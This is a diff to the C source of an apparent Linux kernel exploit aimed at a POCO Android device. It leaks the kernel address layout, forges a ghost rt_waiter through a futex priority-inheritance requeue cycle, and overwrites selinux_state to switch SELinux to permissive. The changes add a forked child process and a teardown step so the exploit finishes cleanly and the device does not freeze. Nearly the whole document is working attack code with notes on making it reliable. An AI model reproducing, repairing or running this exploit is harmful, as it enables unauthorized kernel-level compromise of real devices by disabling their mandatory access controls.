@@ -222,6 +222,8 @@ static volatile int     respray_done  = 0;
 static unsigned long    respray_value = 0;
 static atomic_int       y_tid = 0;
 static atomic_int       x_tid = 0;
+static atomic_int       y_cleanup = 0;
+static atomic_int       x_done    = 0;
 static size_t           fake_lock2_idx = 0;
 
 static unsigned long y_pol = SCHED_NORMAL;
@@ -617,8 +619,10 @@ static void *thread_Y(void *arg)
 
     atomic_store_explicit(&y_done, 1, memory_order_release);
 
-    /* Park forever: the ghost rt_waiter lives on this stack; kernel PI trees
-     * still reference it. Returning would free the stack under a live reference. */
+    /* Resident loop until main asks us to disarm + exit. While resident, the
+     * ghost (forged on this stack, task=dead-end) is reachable by POCO's idle
+     * PI walks; the dead-end task makes that walk terminate instead of
+     * descending into init_task. The disarm below is what lets us exit cleanly. */
     for (;;) {
         if (respray_ready) {
             respray_ready = 0;
@@ -635,9 +639,30 @@ static void *thread_Y(void *arg)
                 pr_info("Y respray ret=%d errno=%d", ret, errno);
             __atomic_store_n(&respray_done, 1, __ATOMIC_RELEASE);
         }
+        if (atomic_load_explicit(&y_cleanup, memory_order_acquire))
+            break;
         if (exit_requested) pthread_exit(NULL);
         sched_yield();
     }
+
+    /* DISARM (reference selinux_permissive.c step 7): clear Y->pi_blocked_on so
+     * the forged ghost is unlinked from every walkable kernel PI tree. An
+     * instant-timeout FUTEX_LOCK_PI on a "locked-by-self" futex forces the
+     * kernel slowpath, whose remove_waiter() path sets task_Y->pi_blocked_on =
+     * NULL. Without this, the corrupted ghost stays linked and futex_exit (or
+     * POCO's idle PI walk) deadlocks the device. */
+    int dummy_pi = (int)(0x80000000U | (unsigned int)getpid());
+    struct timespec ts = { .tv_sec = 0, .tv_nsec = 0 };
+    (void)futex_raw(&dummy_pi, FUTEX_LOCK_PI_PRIVATE, 0, (long)&ts, NULL, 0);
+
+    /* Release L2 so X can wake up and clean up L1. */
+    futex_raw(&pi2, FUTEX_UNLOCK_PI_PRIVATE, 0, 0, NULL, 0);
+
+    /* Wait for X to finish so our stack (and the disarmed ghost) is no longer
+     * referenced before we return. */
+    while (!atomic_load(&x_done))
+        sched_yield();
+    pr_debug("Y: disarmed + L2 released, exiting cleanly");
     pthread_cleanup_pop(0);
     return NULL;
 }
@@ -656,10 +681,13 @@ static void *thread_X(void *arg)
     atomic_store(&x_blocking, 1);
     r = futex_raw(&pi2, FUTEX_LOCK_PI_PRIVATE, 0, 0, NULL, 0);
     pr_debug("X LOCK_PI(L2) returned %ld", r);
-    for (;;) {
-        if (exit_requested) pthread_exit(NULL);
-        sched_yield();
-    }
+
+    /* Woke up (Y released L2 via disarm). Clean up both PI futexes so the
+     * topology is torn down and Y can exit. */
+    futex_raw(&pi1, FUTEX_UNLOCK_PI_PRIVATE, 0, 0, NULL, 0);
+    futex_raw(&pi2, FUTEX_UNLOCK_PI_PRIVATE, 0, 0, NULL, 0);
+    atomic_store_explicit(&x_done, 1, memory_order_release);
+    pr_debug("X: released L1/L2, exiting cleanly");
     pthread_cleanup_pop(0);
     return NULL;
 }
@@ -734,8 +762,10 @@ static int selinux_permissive(void)
 }
 
 /*============================================================================*/
-/*  SECTION 12 : MAIN                                                        */
+/*  SECTION 12 : MAIN (fork+exec transient-child, Option 2)                   */
 /*============================================================================*/
+
+static void run_exploit(void);
 
 int main(void)
 {
@@ -745,12 +775,42 @@ int main(void)
 
     pr_info("stamp=MCAST_BLOCK_SOURCE (IPv4 UDP setsockopt); marker=MCASTLOC");
 
+    pid_t pid = fork();
+    if (pid < 0) {
+        pr_err("fork failed: %s", strerror(errno));
+        return EXIT_FAILURE;
+    }
+    if (pid == 0) {
+        /* CHILD: runs the full exploit, then DISARMS the ghost and joins both
+         * threads so the corrupted PI state is fully unlinked before this
+         * process exits. A clean exit is what avoids the futex_exit deadlock /
+         * POCO idle-PI-walk freeze. The selinux-permissive write persists in
+         * kernel memory regardless of this process's lifetime. */
+        run_exploit();
+        _exit(0);
+    }
+
+    /* PARENT: don't waitpid — child may stall in futex_exit teardown, but that's
+     * contained to the child. Parent parks forever so the device stays responsive
+     * and the selinux-permissive state persists (kernel-memory write). */
+    pr_info("parent: child=%d, parking forever (device stays responsive)", pid);
+    for (;;)
+        sleep(3600);
+    return 0;
+}
+
+/*============================================================================*/
+/*  SECTION 12b : EXPLOIT LOGIC (runs in the child process)                   */
+/*============================================================================*/
+
+static void run_exploit(void)
+{
     ks_base = tracefs_leak_text_base();
     if (!ks_base) {
         pr_warn("tracefs KASLR leak failed; trying perf fallback");
         ks_base = perf_leak_text_base();
     }
-    if (!ks_base) { pr_err("FATAL: all KASLR leaks failed (tracefs + perf)"); return EXIT_FAILURE; }
+    if (!ks_base) { pr_err("FATAL: all KASLR leaks failed (tracefs + perf)"); _exit(EXIT_FAILURE); }
     ks_slide = ks_base - KIMAGE_TEXT_BASE;
     pr_info("KASLR: base=0x%lx slide=0x%lx", ks_base, ks_slide);
 
@@ -758,19 +818,8 @@ int main(void)
     k_init_task     = k_resolve("init_task");
     k_empty_zero_page = k_resolve("empty_zero_page");
 
-    /* fake_lock must be a MAPPED + zeroed region that looks like an empty
-     * rt_mutex (owner=0, waiters tree empty). A populated hash table (e.g.
-     * posix_timers_hashtable) leaves garbage in its waiters tree -> the walk
-     * hits BUG_ON(w->lock != lock) in rt_mutex_top_waiter. Use a small BSS
-     * struct with a large zeroed tail (z_pagemap_global, gap 0x4000). */
     const char *fb = getenv("FAKE_MEM");
     if (!fb || !*fb) fb = "z_pagemap_global";
-    /* Offset DEEP into the zeroed BSS tail (reference uses creds_hash+0x1000+0x200)
-     * so that both fake_lock AND its parent (fake_lock-8) sit in zeroed memory.
-     * If parent is still inside a real struct (nonzero prio), the rbtree insert
-     * makes our node the LEFT child and the write lands at target-8 (misses
-     * selinux->enforcing). 0x1200 guarantees the parent is zeroed -> right child
-     * -> write lands exactly at target. */
     unsigned long fake_off = 0x1200;
     const char *fo = getenv("FAKE_OFF");
     if (fo && *fo) fake_off = (unsigned long)strtoull(fo, NULL, 0);
@@ -801,7 +850,7 @@ int main(void)
     if (!k_selinux || !k_init_task || !k_fake_lock) {
         pr_err("FATAL: unresolved symbols (selinux=%lx init_task=%lx fake_lock=%lx)",
                k_selinux, k_init_task, k_fake_lock);
-        return EXIT_FAILURE;
+        _exit(EXIT_FAILURE);
     }
     pr_info("selinux_state = 0x%lx", k_selinux);
     pr_info("init_task     = 0x%lx", k_init_task);
@@ -828,8 +877,8 @@ int main(void)
     tgkill(getpid(), (int)atomic_load(&y_tid), SIGUSR1);
 
     pr_debug("CMP_REQUEUE_PI returned %ld", r);
-    if (r >= 0) { pr_err("cycle NOT detected"); return EXIT_FAILURE; }
-    if (-r != EDEADLK && -r != EDEADLOCK) { pr_err("not EDEADLK: %s", strerror((int)-r)); return EXIT_FAILURE; }
+    if (r >= 0) { pr_err("cycle NOT detected"); _exit(EXIT_FAILURE); }
+    if (-r != EDEADLK && -r != EDEADLOCK) { pr_err("not EDEADLK: %s", strerror((int)-r)); _exit(EXIT_FAILURE); }
     pr_success("-EDEADLK: full chain walk caught PI cycle");
 
     while (!atomic_load_explicit(&y_done, memory_order_acquire));
@@ -837,7 +886,7 @@ int main(void)
     /* PHASE 1: settle ghost into fake_lock via MIN_CHAINWALK */
     pr_debug("phase1: sched_setscheduler(Y) -> settle ghost");
     if (trigger_adj_pi(atomic_load_explicit(&y_tid, memory_order_acquire)) < 0) {
-        pr_err("phase1: sched_setscheduler failed"); return EXIT_FAILURE;
+        pr_err("phase1: sched_setscheduler failed"); _exit(EXIT_FAILURE);
     }
     usleep(100000);
     pr_success("phase1: chain walk settled");
@@ -845,19 +894,13 @@ int main(void)
     /* PHASE 2: selinux permissive flip */
     selinux_permissive();
 
-    /* STABLE EXIT — do NOT terminate the process.
-     * The ghost rt_waiter lives on thread Y's stack and is linked into the kernel
-     * PI/futex waiters trees (fake_lock BSS region + pi1/pi2 pi_state trees).
-     * Exiting — even via SIGUSR2 + FUTEX_UNLOCK_PI — frees Y's stack under a live
-     * kernel reference, so futex_exit / rt_mutex cleanup deadlocks POCO's
-     * 5.15.180 (watchdog reboot / unresponsive device).
-     * Reference exploits universally keep the ghost-holding thread alive and park
-     * the process forever (poc-ref/mcast_permissive.c:673, IonStackQuest3/exp32,
-     * ghostlock17.c). selinux_permissive() wrote kernel memory, so the permissive
-     * state persists independently of this process. X and Y keep spinning in their
-     * for(;;) loops (exit_requested is never set), keeping their stacks mapped. */
-    pr_success("=== selinux permissive achieved; parking forever (device stays responsive) ===");
-    for (;;)
-        sleep(3600);
-    return 0;
+    /* DISARM + clean teardown (reference step 7). Tell Y to clear its
+     * pi_blocked_on (unlinking the ghost) and release L2; X then releases
+     * L1/L2 and signals x_done. Join both so their stacks (and the ghost)
+     * are fully unreferenced before any process exit — this is what prevents
+     * the futex_exit deadlock / POCO idle-PI-walk freeze. */
+    atomic_store_explicit(&y_cleanup, 1, memory_order_release);
+    pthread_join(ty, NULL);
+    pthread_join(tx, NULL);
+    pr_success("=== ghost disarmed, threads joined; selinux permissive persists ===");
 }
